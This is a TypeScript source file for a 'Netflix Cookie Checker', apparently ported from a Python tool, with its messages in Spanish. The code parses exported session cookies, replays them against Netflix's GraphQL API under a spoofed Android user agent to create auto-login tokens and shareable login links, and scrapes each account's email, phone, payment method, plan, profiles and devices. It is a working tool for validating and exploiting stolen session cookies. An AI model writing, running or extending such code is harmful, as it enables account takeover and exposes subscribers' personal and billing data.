// Netflix Cookie Checker - Port of Python NetflixTokenChecker to TypeScript

// ─── Types ───────────────────────────────────────────────────────────────────

export interface NFTokenResult {
  success: boolean;
  token?: string;
  link?: string;
  error?: string;
}

export interface NetflixMetadata {
  country?: string;
  countryName?: string;
  plan?: string;
  price?: string;
  currency?: string;
  videoQuality?: string;
  maxStreams?: number;
  status?: string;
  memberSince?: string;
  nextBilling?: string;
  email?: string;
  phone?: string;
  paymentMethod?: string;
  profiles?: string;
  devices?: string;
}

export interface CheckResult {
  success: boolean;
  token?: string;
  link?: string;
  metadata?: NetflixMetadata;
  error?: string;
}

// ─── Constants ───────────────────────────────────────────────────────────────

const NETFLIX_GRAPHQL_URL = "https://android13.prod.ftl.netflix.com/graphql";
const NETFLIX_MEMBERSHIP_URL = "https://www.netflix.com/account/membership";
const NF_TOKEN_BASE = "https://www.netflix.com/browse";
const FETCH_TIMEOUT = 30000;

const ANDROID_USER_AGENT =
  "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";

const COUNTRY_NAMES: Record<string, string> = {
  US: "Estados Unidos",
  GB: "Reino Unido",
  CA: "Canadá",
  AU: "Australia",
  FR: "Francia",
  DE: "Alemania",
  JP: "Japón",
  BR: "Brasil",
  MX: "México",
  AR: "Argentina",
  CO: "Colombia",
  CL: "Chile",
  ES: "España",
  IT: "Italia",
  KR: "Corea del Sur",
  IN: "India",
  TR: "Turquía",
  SE: "Suecia",
  NL: "Países Bajos",
  PL: "Polonia",
  TH: "Tailandia",
  PH: "Filipinas",
  ID: "Indonesia",
  MY: "Malasia",
  SG: "Singapur",
  NZ: "Nueva Zelanda",
  IE: "Irlanda",
  PT: "Portugal",
  BE: "Bélgica",
  AT: "Austria",
  CH: "Suiza",
  DK: "Dinamarca",
  FI: "Finlandia",
  NO: "Noruega",
  ZA: "Sudáfrica",
  NG: "Nigeria",
  EG: "Egipto",
  SA: "Arabia Saudita",
  AE: "Emiratos Árabes",
  IL: "Israel",
};

// ─── JSON Utilities ──────────────────────────────────────────────────────────

/** Convert \xHH escape sequences to real characters */
function cleanJsonStr(s: string): string {
  return s.replace(/\\x([0-9a-fA-F]{2})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16))
  );
}

/** Extract balanced JSON starting from position */
function extractBalancedForward(text: string, start: number): string | null {
  let depth = 0;
  let i = start;
  while (i < text.length) {
    const ch = text[i];
    if (ch === "{") depth++;
    else if (ch === "}") {
      depth--;
      if (depth === 0) {
        return text.substring(start, i + 1);
      }
    } else if (ch === '"') {
      // skip string
      i++;
      while (i < text.length) {
        if (text[i] === "\\") {
          i += 2;
          continue;
        }
        if (text[i] === '"') break;
        i++;
      }
    }
    i++;
  }
  return null;
}

/** Extract root JSON object from Netflix HTML response */
function extractRootJson(html: string): any | null {
  // Try to find netflix.reactContext pattern
  const reactCtxMatch = html.indexOf("netflix.reactContext = ");
  if (reactCtxMatch !== -1) {
    const start = html.indexOf("{", reactCtxMatch);
    if (start !== -1) {
      const raw = extractBalancedForward(html, start);
      if (raw) {
        try {
          return JSON.parse(cleanJsonStr(raw));
        } catch {
          // fallback
        }
      }
    }
  }

  // Try to find {"title":"Netflix" pattern
  const titleMatch = html.indexOf('{"title":"Netflix"');
  if (titleMatch !== -1) {
    const raw = extractBalancedForward(html, titleMatch);
    if (raw) {
      try {
        return JSON.parse(cleanJsonStr(raw));
      } catch {
        // fallback
      }
    }
  }

  // Try finding any top-level JSON object
  for (const marker of ['"title":"Netflix"', '"userInfo"', '"membership"']) {
    const idx = html.indexOf(marker);
    if (idx !== -1) {
      // Walk backwards to find the opening {
      let start = idx;
      while (start > 0 && html[start] !== "{") start--;
      const raw = extractBalancedForward(html, start);
      if (raw) {
        try {
          return JSON.parse(cleanJsonStr(raw));
        } catch {
          continue;
        }
      }
    }
  }

  return null;
}

/** Get nested dict value from object */
function getv(d: any, key: string): any {
  if (!d || typeof d !== "object") return undefined;
  return d[key];
}

/** Deep navigation in nested dict */
function dig(data: any, ...keys: string[]): any {
  let current = data;
  for (const key of keys) {
    if (current === null || current === undefined) return undefined;
    current = getv(current, key);
  }
  return current;
}

// ─── Cookie Parsing ──────────────────────────────────────────────────────────

/** Parse Netscape format cookie file content */
function parseNetscapeCookies(content: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  const lines = content.split("\n");

  for (const rawLine of lines) {
    const line = rawLine.trim();
    // Skip comments and empty lines
    if (!line || line.startsWith("#")) continue;

    const parts = line.split("\t");
    if (parts.length >= 7) {
      // Netscape format: domain flag path secure expiration name value
      const name = parts[5].trim();
      const value = parts[6].trim();
      if (name) {
        cookies[name] = value;
      }
    }
  }

  return cookies;
}

/** Extract cookies from JSON (Cookie Editor), Netscape, or raw string formats */
export function extractCookiesFromText(text: string): Record<string, string> | null {
  if (!text || !text.trim()) return null;

  const trimmed = text.trim();

  // Try JSON format (Cookie Editor export)
  if (trimmed.startsWith("[") || trimmed.startsWith("{")) {
    try {
      const parsed = JSON.parse(trimmed);
      const arr = Array.isArray(parsed) ? parsed : [parsed];
      const cookies: Record<string, string> = {};

      for (const item of arr) {
        if (item && item.name && item.value !== undefined) {
          cookies[item.name] = item.value;
        }
      }

      if (Object.keys(cookies).length > 0) return cookies;
    } catch {
      // Not valid JSON, try other formats
    }
  }

  // Try Netscape format (tab-separated)
  if (trimmed.includes("\t")) {
    const cookies = parseNetscapeCookies(trimmed);
    if (Object.keys(cookies).length > 0) return cookies;
  }

  // Try raw cookie string format: "name=value; name2=value2; ..."
  if (trimmed.includes("=")) {
    const cookies: Record<string, string> = {};
    const pairs = trimmed.split(";");

    for (const pair of pairs) {
      const eqIdx = pair.indexOf("=");
      if (eqIdx > 0) {
        const name = pair.substring(0, eqIdx).trim();
        const value = pair.substring(eqIdx + 1).trim();
        if (name) {
          cookies[name] = value;
        }
      }
    }

    if (Object.keys(cookies).length > 0) return cookies;
  }

  return null;
}

/** Build cookie header string from cookie dictionary */
export function buildCookieString(
  cookieDict: Record<string, string>,
  onlyAndroid: boolean = false
): string {
  // Core Android cookies that Netflix needs
  const androidKeys = new Set([
    "NetflixId",
    "SecureNetflixId",
    "nfvdid",
    "clid",
    "bid",
    "pmtest",
    "uuid",
    "mtToken",
    "prid",
  ]);

  const pairs: string[] = [];

  for (const [key, value] of Object.entries(cookieDict)) {
    if (!value) continue;
    if (onlyAndroid && !androidKeys.has(key)) continue;
    pairs.push(`${key}=${value}`);
  }

  return pairs.join("; ");
}

// ─── NFToken Generation ─────────────────────────────────────────────────────

/** Call Netflix GraphQL API to generate NFToken */
export async function checkCookie(
  cookieDict: Record<string, string>
): Promise<NFTokenResult> {
  const netflixId = cookieDict["NetflixId"];
  const secureNetflixId = cookieDict["SecureNetflixId"];
  const nfvdid = cookieDict["nfvdid"];

  if (!netflixId && !secureNetflixId) {
    return {
      success: false,
      error: "No se encontraron cookies válidas (NetflixId o SecureNetflixId)",
    };
  }

  const cookieString = buildCookieString(cookieDict, true);

  const graphqlBody = JSON.stringify({
    operationName: "CreateAutoLoginToken",
    variables: {},
    query: `mutation CreateAutoLoginToken{createAutoLoginToken{autoLoginToken{token,tokenType}}}`,
  });

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT);

    const response = await fetch(NETFLIX_GRAPHQL_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": ANDROID_USER_AGENT,
        Cookie: cookieString,
        "X-Netflix.browserName": "Chrome",
        "X-Netflix.browserVersion": "120.0",
        "Accept-Language": "en-US,en;q=0.9",
      },
      body: graphqlBody,
      signal: controller.signal,
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      return {
        success: false,
        error: `Netflix API respondió con estado ${response.status}`,
      };
    }

    const data = await response.json();

    // Navigate the response to find the token
    const token = dig(
      data,
      "data",
      "createAutoLoginToken",
      "autoLoginToken",
      "token"
    );

    if (token) {
      const link = `${NF_TOKEN_BASE}?autoLoginToken=${token}`;
      return {
        success: true,
        token,
        link,
      };
    }

    // Check for errors
    const errors = data.errors;
    if (errors && Array.isArray(errors) && errors.length > 0) {
      return {
        success: false,
        error: errors[0]?.message || "Error en la API de Netflix",
      };
    }

    return {
      success: false,
      error: "No se pudo generar el NFToken (cookie inválida o expirada)",
    };
  } catch (err: any) {
    if (err.name === "AbortError") {
      return { success: false, error: "Timeout: Netflix no respondió a tiempo" };
    }
    return {
      success: false,
      error: `Error de conexión: ${err.message || "Desconocido"}`,
    };
  }
}

// ─── Metadata Extraction ─────────────────────────────────────────────────────

/** Fetch Netflix membership page and extract metadata */
export async function getMetadata(
  cookieDict: Record<string, string>
): Promise<NetflixMetadata> {
  const metadata: NetflixMetadata = {};

  const cookieString = buildCookieString(cookieDict, false);

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), FETCH_TIMEOUT);

    const response = await fetch(NETFLIX_MEMBERSHIP_URL, {
      method: "GET",
      headers: {
        "User-Agent": ANDROID_USER_AGENT,
        Cookie: cookieString,
        "Accept-Language": "en-US,en;q=0.9",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      },
      signal: controller.signal,
      redirect: "follow",
    });

    clearTimeout(timeoutId);

    if (!response.ok) {
      return metadata;
    }

    const html = await response.text();

    // Extract JSON from HTML
    const jsonData = extractRootJson(html);

    if (jsonData) {
      // Extract user info
      const userInfo = dig(jsonData, "data", "userInfo");
      if (userInfo) {
        // Country
        const country = dig(userInfo, "countryOfSignup");
        if (country) {
          metadata.country = country;
          metadata.countryName = COUNTRY_NAMES[country] || country;
        }

        // Membership info
        const membership = dig(userInfo, "membership");
        if (membership) {
          // Plan
          const planName = dig(membership, "planName") || dig(membership, "currentSubscription", "planName");
          if (planName) metadata.plan = planName;

          // Status
          const status = dig(membership, "status") || dig(membership, "currentSubscription", "status");
          if (status) metadata.status = status;

          // Member since
          const memberSince = dig(membership, "memberSince") || dig(membership, "memberSinceDate");
          if (memberSince) metadata.memberSince = memberSince;

          // Next billing
          const nextBilling = dig(membership, "nextBillingDate") || dig(membership, "currentSubscription", "nextBillingDate");
          if (nextBilling) metadata.nextBilling = nextBilling;
        }

        // Current subscription details
        const subscription = dig(userInfo, "membership", "currentSubscription");
        if (subscription) {
          const price = dig(subscription, "price") || dig(subscription, "amount");
          if (price !== undefined) {
            metadata.price = String(price);
          }

          const currency = dig(subscription, "currency") || dig(subscription, "priceCurrency");
          if (currency) metadata.currency = currency;
        }

        // Plan features
        const planFeatures = dig(userInfo, "membership", "planFeatures") || dig(userInfo, "planFeatures");
        if (planFeatures) {
          if (typeof planFeatures === "string") {
            // Try to extract video quality from the features string
            const qualityMatch = planFeatures.match(/(\d+p|HD|Ultra HD|4K|HDR|Standard|Basic|Premium|UHD)/i);
            if (qualityMatch) {
              metadata.videoQuality = qualityMatch[0];
            }
          } else if (Array.isArray(planFeatures)) {
            const qualityStr = planFeatures.join(", ");
            const qualityMatch = qualityStr.match(/(\d+p|HD|Ultra HD|4K|HDR|Standard|Basic|Premium|UHD)/i);
            if (qualityMatch) {
              metadata.videoQuality = qualityMatch[0];
            }
          }
        }

        // Max streams
        const maxScreens = dig(userInfo, "maxScreens") || dig(userInfo, "membership", "maxScreens") || dig(userInfo, "membership", "currentSubscription", "maxScreens");
        if (maxScreens !== undefined) {
          metadata.maxStreams = Number(maxScreens);
        }

        // Email
        const email = dig(userInfo, "email") || dig(userInfo, "userEmail");
        if (email) metadata.email = email;

        // Phone
        const phone = dig(userInfo, "phone") || dig(userInfo, "phoneNumber");
        if (phone) metadata.phone = phone;
      }

      // Payment method
      const paymentInfo = dig(jsonData, "data", "paymentInfo") || dig(jsonData, "data", "userInfo", "paymentInfo");
      if (paymentInfo) {
        const method = dig(paymentInfo, "paymentMethod") || dig(paymentInfo, "method") || dig(paymentInfo, "description");
        if (method) metadata.paymentMethod = method;
      }

      // Profiles
      const profiles = dig(jsonData, "data", "profiles") || dig(jsonData, "data", "userInfo", "profiles");
      if (profiles) {
        if (Array.isArray(profiles)) {
          metadata.profiles = profiles.map((p: any) => p.name || p.profileName || "Sin nombre").join(", ");
        } else if (typeof profiles === "string") {
          metadata.profiles = profiles;
        }
      }

      // Devices
      const devices = dig(jsonData, "data", "devices") || dig(jsonData, "data", "userInfo", "devices");
      if (devices) {
        if (Array.isArray(devices)) {
          metadata.devices = `${devices.length} dispositivo(s) activo(s)`;
        } else if (typeof devices === "string") {
          metadata.devices = devices;
        }
      }
    }

    // If JSON parsing didn't work well, try regex extraction from HTML
    if (!metadata.country && !metadata.plan) {
      // Try to extract from HTML content
      const countryRegex = /countryOfSignup['":\s]+['"]([A-Z]{2})['"]/;
      const countryMatch = html.match(countryRegex);
      if (countryMatch) {
        metadata.country = countryMatch[1];
        metadata.countryName = COUNTRY_NAMES[countryMatch[1]] || countryMatch[1];
      }

      // Try to get plan from the page title or content
      const planRegex = /(?:plan|subscription)[^"]*?['"]([^'"]+)['"]/i;
      const planMatch = html.match(planRegex);
      if (planMatch) metadata.plan = planMatch[1];

      // Try email
      const emailRegex = /([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/;
      const emailMatch = html.match(emailRegex);
      if (emailMatch) metadata.email = emailMatch[1];
    }
  } catch (err: any) {
    // Return whatever we managed to get
    console.error("Error fetching metadata:", err.message);
  }

  return metadata;
}

// ─── Full Check ──────────────────────────────────────────────────────────────

/** Full check: NFToken + metadata */
export async function fullCheck(
  cookieText: string
): Promise<CheckResult> {
  const cookieDict = extractCookiesFromText(cookieText);

  if (!cookieDict || Object.keys(cookieDict).length === 0) {
    return {
      success: false,
      error: "No se pudieron extraer cookies del texto proporcionado",
    };
  }

  // Check NFToken
  const tokenResult = await checkCookie(cookieDict);

  if (!tokenResult.success) {
    return {
      success: false,
      error: tokenResult.error,
    };
  }

  // Get metadata (don't fail if this fails)
  let metadata: NetflixMetadata = {};
  try {
    metadata = await getMetadata(cookieDict);
  } catch {
    // Non-critical, continue
  }

  return {
    success: true,
    token: tokenResult.token,
    link: tokenResult.link,
    metadata,
  };
}
